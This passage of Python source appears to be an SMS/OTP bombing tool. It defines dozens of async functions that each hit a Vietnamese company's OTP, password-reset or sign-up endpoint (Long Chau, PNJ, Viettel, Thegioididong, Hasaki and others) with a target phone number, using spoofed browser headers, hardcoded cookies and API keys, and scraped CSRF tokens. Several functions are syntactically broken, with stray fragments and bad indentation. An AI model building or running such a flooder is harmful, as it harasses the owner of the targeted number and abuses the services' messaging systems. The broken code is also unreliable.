        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    }

    json_data = {
        'fromSys': 'WebVaccine',
        'phoneNumber': phone,
        'OTPType': 1,
    }

    try:

        response = await make_request('POST', 
        'https://api.tiemchunglongchau.com.vn/gw/is/user/new-send-verification',
        headers=headers,
        json=json_data
    )

        print(f"tiemchunglczl | -> OK         ")
    except Exception:
        print(f"tiemchunglczl | ~> Lỗi ")

async def tiemchunglc1(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptenantid': '0b7bff7f-acb3-49db-9bef-8bf85697cbc4',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://tiemchunglongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://tiemchunglongchau.com.vn/',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    }

    json_data = {
        'fromSys': 'WebVaccine',
        'phoneNumber': phone,
        'OTPType': 0,
    }
    try:

        response = await make_request('POST', 
        'https://api.tiemchunglongchau.com.vn/gw/is/user/new-send-verification',
        headers=headers,
        json=json_data
    )

        print(f"tclongchau1 | -> OK         ")
    except Exception:
        print(f"tclongchau1 | ~> Lỗi ")


async def dongcre(phone):
    cookies = {
        '_gcl_au': '1.1.1105630514.1745301215',
        '_gid': 'GA1.2.1453940041.1745301216',
        '_gat_UA-151110385-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '01JSE0Y78E732HS81G6D25PE76_.tt.1',
        '_ym_uid': '1745301217121844903',
        '_ym_d': '1745301217',
        '_ga': 'GA1.1.1288857733.1745301216',
        '_ga_P2783EHVX2': 'GS1.1.1745301215.1.1.1745301217.58.0.0',
        '_ym_isad': '1',
        'ttcsid': '1745301216531.1.1745301217794',
        '_ym_visorc': 'b',
        'ttcsid_C0CHFOD2JJH938MD2ABG': '1745301216530.1.1745301249160',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        # 'cookie': '_gcl_au=1.1.1105630514.1745301215; _gid=GA1.2.1453940041.1745301216; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=01JSE0Y78E732HS81G6D25PE76_.tt.1; _ym_uid=1745301217121844903; _ym_d=1745301217; _ga=GA1.1.1288857733.1745301216; _ga_P2783EHVX2=GS1.1.1745301215.1.1.1745301217.58.0.0; _ym_isad=1; ttcsid=1745301216531.1.1745301217794; _ym_visorc=b; ttcsid_C0CHFOD2JJH938MD2ABG=1745301216530.1.1745301249160',
    }

    json_data = {
        'login': phone,
        'trackingId': 'S6eexoZzi8cmabgO2aJqpUjPTe2RtmB5wZkUecSAqiE78krwxjZNfA9UiL7ITFoS',
    }

    try:

        response = await make_request('POST', 'https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)

        print(f"dongcre | -> OK         ")
    except Exception:
        print(f"dongcre | ~> Lỗi ")

async def pnj(phone):
    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)

        print(f"pnj | -> OK         ")
    except Exception:
        print(f"pnj | ~> Lỗi ")


async def bachhoaxanh(phone):
    headers = {
        'Host': 'apibhx.tgdd.vn',
        'content-type': 'application/json',
        'reversehost': 'http://bhxapi.live',
        'accept': 'application/json',
        'authorization': 'Bearer CC6A8F74975C79FD878A5699E89B37B8',
        'appscreen': 'Profile',
        'accept-language': 'vi-VN,vi;q=0.9',
        'platform': 'ios',
        'deviceid': '3FDC7F19-87DD-4DEC-ACC4-8192A8FD4782',
        'user-agent': 'iOS||17.4.1||3FDC7F19-87DD-4DEC-ACC4-8192A8FD4782||VersionApp 2.0.19 ',
        'xapikey': 'bhx-api-core-2022',
    }

    json_data = {
        'UserName': phone,
        'DeviceId': '3FDC7F19-87DD-4DEC-ACC4-8192A8FD4782',
        'OS': 'ios',
        'Relogin': False,
        'DeviceName': 'iPhone 13',
        'isOnlySMS': 0,
    }

    try:

        response = await make_request('POST', 'https://apibhx.tgdd.vn/User/LoginByNumberPhone', headers=headers, json=json_data)


        print(f"BACHHOAXANH | -> OK         ")
    except Exception:
        print(f"BACHHOAXANH | ~> Lỗi ")

async def mycall(phone):
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': '01KBW8W7AJ2D4HVCZ1BB000HTE_.tt.1',
        'ttcsid_D3T1GF3C77U93U3T8AM0': 'undefined.undefined.1765106664561.1',
        'ttcsid': '1770345939697::Rq4f9dAO6kJP_8loBsSj.2.1770345949708.0',
        'ttcsid_D5Q8RDRC77U581RUT05G': '1770345939696::EvI8puQhYCuYMwhVJJFZ.1.1770345949710.1',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6,zh-CN;q=0.5,zh;q=0.4',
        'Connection': 'keep-alive',
        'Referer': 'https://h5.mycall.vn/pages/user/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'use-language': 'vn',
        # 'Cookie': '_tt_enable_cookie=1; _ttp=01KBW8W7AJ2D4HVCZ1BB000HTE_.tt.1; ttcsid_D3T1GF3C77U93U3T8AM0=undefined.undefined.1765106664561.1; ttcsid=1770345939697::Rq4f9dAO6kJP_8loBsSj.2.1770345949708.0; ttcsid_D5Q8RDRC77U581RUT05G=1770345939696::EvI8puQhYCuYMwhVJJFZ.1.1770345949710.1',
    }

    params = {
        'mobile': phone,
        'imgCode': '',
        'userType': 'member',
    }

    try:

        response = await make_request('GET',
        'https://h5.mycall.vn/we-apis/v1.0/verify/sendMobileCode',
        params=params,
        cookies=cookies,
        headers=headers
    )

        print(f"MYCALL | -> OK         ")
    except Exception:
        print(f"MYCALL | ~> Lỗi ")

async def onlive(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'devicename': 'Windows Chrome',
        'deviceplatform': '1',
        'origin': 'https://onlivetv.vn',
        'priority': 'u=1, i',
        'referer': 'https://onlivetv.vn/',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-api-key': '162C7D559DE4DD383DFD9867A456D8AA',
    }

    json_data = {
        'phone': phone,
        'otp_provider': 'sms',
    }

    try:

        response = await make_request('POST', 'https://id-public-api.onlivetv.vn/api/request_otp', headers=headers, json=json_data)

        print(f"onlive | -> OK         ")
    except Exception:
        print(f"onlive | ~> Lỗi ")

async def onlivezl(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'devicename': 'Windows Chrome',
        'deviceplatform': '1',
        'origin': 'https://onlivetv.vn',
        'priority': 'u=1, i',
        'referer': 'https://onlivetv.vn/',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'x-api-key': '162C7D559DE4DD383DFD9867A456D8AA',
    }

    json_data = {
        'phone': phone,
        'otp_provider': 'zalo',
    }

    try:

        response = await make_request('POST', 'https://id-public-api.onlivetv.vn/api/request_otp', headers=headers, json=json_data)

        ")
    except Exception:
        print(f"onlivezl | ~> Lỗi ")



async def hoahao(phone):
    headers = {
        'Host': 'nthsoft.vn',
        'Sec-Fetch-Site': 'cross-site',
        'Origin': 'capacitor://localhost',
        'Sec-Fetch-Mode': 'cors',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Sec-Fetch-Dest': 'empty',
    }

    params = {
        'phone': phone,
        'isEmail': 'false',
        'platform': 'mobile',
    }

    try:

        response = await make_request('GET', 'https://nthsoft.vn/online/otp/send', params=params, headers=headers)

        ")
    except Exception:
        print(f"HOAHAO | ~> Lỗi ")
async def ilokafood1(phone):
    cookies = {
        'ILOKA-WS': '1777102369.864.5103.756950|7d97ca2a735a036d5150c4a12cf43ab6',
    }

    headers = {
        'Host': 'gateway.iloka.vn',
        # 'Cookie': 'ILOKA-WS=1777102369.864.5103.756950|7d97ca2a735a036d5150c4a12cf43ab6',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'App/1 CFNetwork/3860.400.51 Darwin/25.3.0',
        'accept-language': 'en-VN,en;q=0.5',
        'priority': 'u=3',
    }

    json_data = {
        'id': '72323',
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'https://gateway.iloka.vn/api/v2/customer/sentVoiceOTP', cookies=cookies, headers=headers, json=json_data)

        print(f"ILOKAFOOD1 | -> OK         ")
    except Exception:
        print(f"ILOKAFOOD1 | ~> Lỗi ")
async def ilokafood2(phone):
    cookies = {
        'ILOKA-WS': '1777102369.864.5103.756950|7d97ca2a735a036d5150c4a12cf43ab6',
    }

    headers = {
        'Host': 'gateway.iloka.vn',
        # 'Cookie': 'ILOKA-WS=1777102369.864.5103.756950|7d97ca2a735a036d5150c4a12cf43ab6',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'App/1 CFNetwork/3860.400.51 Darwin/25.3.0',
        'accept-language': 'en-VN,en;q=0.5',
        'priority': 'u=3',
    }

    json_data = {
        'id': '72323',
        'phone': phone,
    }

    try:

        response = await make_request('POST', 'https://gateway.iloka.vn/api/v2/customer/sentZaloOTP', cookies=cookies, headers=headers, json=json_data)

        print(f"ILOKAFOOD2 | -> OK         ")
    except Exception:
        print(f"ILOKAFOOD2 | ~> Lỗi ")


async def heyu(phone):
    headers = {
        'Host': 'api.heyu.asia',
        'accept': 'application/json, text/plain, */*',
        'x-access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHRlc3QuY29tIiwicGFzc3dvcmQiOiJzaGVlcDEyMzQ1Njc4IiwiaWF0IjoxNDc0OTcwMzc3fQ.38hjO99PEhzk1IT8l16zbKemikhPHHAqZzsSw8lmWtE',
        'content-type': 'application/json;charset=utf-8',
        'goal': '26476',
        'user-agent': 'HeyU/4000016 CFNetwork/1568.200.51 Darwin/24.1.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': phone,
        'deviceId': str(uuid.uuid4()).upper(),
        'regionName': '',
        'modeApp': '',
        'platform': 'ios',
        'nativeVersion': '4000016',
        'versionCodePush': '',
        'tShoot': int(time.time() * 1000),
    }

    try:

        response = await make_request('POST', 'https://api.heyu.asia/api/v2.1/member/send-code', headers=headers, json=json_data)

        print(f"HEYU | -> OK         ")
    except Exception:
        print(f"HEYU | ~> Lỗi ")

async def thecoffeehouse(phone):
    headers = {
        'Accept': 'application/json',
        'TCH-DEVICE-ID': str(uuid.uuid4()).upper(),
        'Accept-Language': 'vi',
        'Accept-Encoding': 'gzip, deflate',
        'branch': 'TCH',
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'TCHApp/5.10.29 (iPhone; iOS 18.1; Scale/3.00)',
        'Connection': 'keep-alive',
        'TCH-APP-VERSION': '5.10.29',
    }
    json_data = {
        'phone': {'phone_number': phone, 'region_code': '+84'},
        'hostkey': '14103/73b227f6595e458d95f3d7472c094f0a/1070038fwf1qS',
    }
    try:

        response = await make_request('POST', 'https://api.thecoffeehouse.com/api/v5/auth/request-otp', headers=headers, json=json_data)
        print(f"TCH | -> OK         ")
    except Exception:
        print(f"TCH | ~> Lỗi ")

async def thegioi(phone):
    import re as _re
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'

        try:
            r0 = await make_request('GET', 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
                headers={'User-Agent': ua, 'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8'},
                timeout=REQUEST_TIMEOUT)
            m = _re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r0.text)
            rvt = m.group(1) if m else ''
            headers = {
                'Accept': '*/*', 'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'DNT': '1', 'Origin': 'https://www.thegioididong.com',
                'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
                'User-Agent': ua, 'X-Requested-With': 'XMLHttpRequest',
            }
            data = {'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1', '__RequestVerificationToken': rvt}
            response = await make_request('POST', 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                headers=headers, data=data, timeout=REQUEST_TIMEOUT)
            print(f"THEGIOI | -> OK         ")
        except Exception:
            print(f"THEGIOI | ~> Lỗi ")

async def dienmayxanh(phone):
    import re as _re
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'

        try:
            r0 = await make_request('GET', 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
                headers={'User-Agent': ua, 'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8'},
                timeout=REQUEST_TIMEOUT)
            m = _re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r0.text)
            rvt = m.group(1) if m else ''
            headers = {
                'Accept': '*/*', 'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'DNT': '1', 'Origin': 'https://www.dienmayxanh.com',
                'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
                'User-Agent': ua, 'X-Requested-With': 'XMLHttpRequest',
            }
            data = {'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1', '__RequestVerificationToken': rvt}
            response = await make_request('POST', 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                headers=headers, data=data, timeout=REQUEST_TIMEOUT)
            print(f"DMX | -> OK         ")
        except Exception:
            print(f"DMX | ~> Lỗi ")

async def batdongsan(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'dnt': '1',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }
    params = {'phoneNumber': phone}
    try:

        response = await make_request('GET', 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers)
        print(f"BDS | -> OK         ")
    except Exception:
        print(f"BDS | ~> Lỗi ")

async def myvt(phone):
    ua = 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36'

        try:
            await make_request('GET', 'https://viettel.vn/', headers={
                'User-Agent': ua, 'Accept-Language': 'vi',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }, timeout=REQUEST_TIMEOUT)
            from urllib.parse import unquote as _unquote
            xsrf_raw = session.cookies.get('XSRF-TOKEN', '')
            x_xsrf = _unquote(xsrf_raw) if xsrf_raw else ''
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'vi',
                'content-type': 'application/json;charset=utf-8',
                'origin': 'https://viettel.vn',
                'referer': 'https://viettel.vn/',
                'user-agent': ua,
            }
            if x_xsrf:
                headers['x-csrf-token'] = x_xsrf
                headers['x-xsrf-token'] = x_xsrf
            json_data = {
                'phone': phone,
                'typeCode': 'DI_DONG',
                'actionCode': 'myviettel://login_mobile',
                'type': 'otp_login',
            }
            response = await make_request('POST', 'https://viettel.vn/api/getOTPLoginCommon', headers=headers, json=json_data, timeout=REQUEST_TIMEOUT)
            print(f"myvt | -> OK         ")
        except Exception:
            print(f"myvt | ~> Lỗi ")

async def vtpost(phone):
    import re as _re
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'

        try:
            r0 = await make_request('GET', 'https://id.viettelpost.vn/Account/Register',
                headers={'User-Agent': ua, 'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
                timeout=REQUEST_TIMEOUT)
            m = _re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r0.text)
            rvt = m.group(1) if m else ''
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'DNT': '1', 'Origin': 'https://id.viettelpost.vn',
                'Referer': 'https://id.viettelpost.vn/Account/Register',
                'User-Agent': ua,
            }
            data = {
                'FormRegister.FullName': random_vietnamese_name(),
                'FormRegister.Phone': phone,
                'FormRegister.Password': 'BEAUTYBOX12a@',
                'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
                'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
                'ConfirmOtpType': 'Register',
                'FormRegister.IsRegisterFromPhone': 'true',
                '__RequestVerificationToken': rvt,
            }
            response = await make_request('POST', 'https://id.viettelpost.vn/Account/SendOTPByPhone',
                headers=headers, data=data, timeout=REQUEST_TIMEOUT)
            print(f"VTPOST | -> OK         ")
        except Exception:
            print(f"VTPOST | ~> Lỗi ")

async def vhome(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://market.vinhomes.vn/api/user/register/phone',
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Accept-Language': 'vi',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Origin': 'https://market.vinhomes.vn',
                'Referer': 'https://market.vinhomes.vn/',
            },
            json={'phone': phone_fmt},
        )
        print(f"VINHOMES | -> OK -> ")
    except Exception:
        print(f"VINHOMES | ~> Lỗi ")

async def hasaki(phone): #ap
    cookies = {
        'HASAKI_SESSID': '6102738a7d4150838d926feecde59178',
        'form_key': '6102738a7d4150838d926feecde59178',
        'sessionChecked': '1748365104',
    }

    headers = {
        'Host': 'api.hasaki.vn',
        # 'Cookie': 'HASAKI_SESSID=6102738a7d4150838d926feecde59178; form_key=6102738a7d4150838d926feecde59178; sessionChecked=1748365104',
        'content-type': 'application/json; charset=utf-8',
        'mobileappversion': '2.4.04',
        'mobileregion': 'VN',
        'accept': 'application/json',
        'mobileosversion': '17.4.1',
        'accept-language': 'vi-VN,vi;q=0.9',
        'mobilecartid': '0',
        'mobiledeviceid': 'A06BE9DA-55B4-4C2F-A994-D28EEDB4E5B1',
        'user-agent': 'Hasaki.vn/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'mobileplatform': 'ios',
    }

    params = {
        'username': phone,
    }

    try:

        response = await make_request('GET', 'https://api.hasaki.vn/mobile/v3/user/get-code-verify', params=params, cookies=cookies, headers=headers)

        print(f"HASAKI | -> OK         ")
    except Exception:
        print(f"HASAKI | ~> Lỗi ")  
async def ivuvu(phone):
    headers = {
        'Host': 'apiportal.ivivu.com',
        'content-type': 'application/json, application/json; charset=utf-8',
        'accept': '*/*',
        'sec-fetch-site': 'cross-site',
        'appversion': '4.12.11',
        'priority': 'u=3, i',
        'accept-language': 'vi-VN,vi;q=0.9',
        'cache-control': 'no-cache',
        'sec-fetch-mode': 'cors',
        'origin': 'capacitor://localhost',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'sec-fetch-dest': 'empty',
    }

    json_data = {
        'phoneNumber': phone,
        'password': 'password123',
        'password2': 'password123'
    }

    try:

        response = await make_request('POST', 'https://apiportal.ivivu.com/app_prot/api/account/RegisterByPhone', headers=headers, json=json_data)

        print(f"IVUVU | -> OK         ")
    except Exception:
        print(f"IVUVU | ~> Lỗi ")     

async def sapo(phone):
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.7 Mobile/15E148 Safari/604.1',
        'Origin': 'https://accounts.sapo.vn',
    }
    json_data = {
        'country_code': '84',
        'phone_number': phone,
        'type': 'REQUEST_REGISTER',
        'register_token': '9nPP052QOct0EPHScqnHMMyHvGc4dgXrDCOE',
    }
    try:

        response = await make_request('POST', 'https://accounts.sapo.vn/otp/get_last', headers=headers, json=json_data)
        print(f"SAPO | -> OK         ")
    except Exception:
        print(f"SAPO | ~> Lỗi ")


async def onehousing(phone):
    import re as _re
    ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    try:
        r0, _ = await     response = await make_request('GET', 'https://onehousing.vip/form-ung-tuyen/',
            headers={'User-Agent': ua, 'Accept': 'text/html', 'Accept-Language': 'vi-VN,vi;q=0.9'})
        html = r0.text
        token = (_re.search(r'data-token=["\']([^"\']+)["\']', html) or [None,None])[1] or 'a39d6d88080a242585084b851e8102eb'
        token_time = (_re.search(r'data-token-time=["\']([^"\']+)["\']', html) or [None,'1783223414'])[1]
    except Exception:
        token, token_time = 'a39d6d88080a242585084b851e8102eb', '1783223414'

    import random as _r
    data = {
        'action': 'wpforms_submit',
        'page_title': 'Form ứng tuyển',
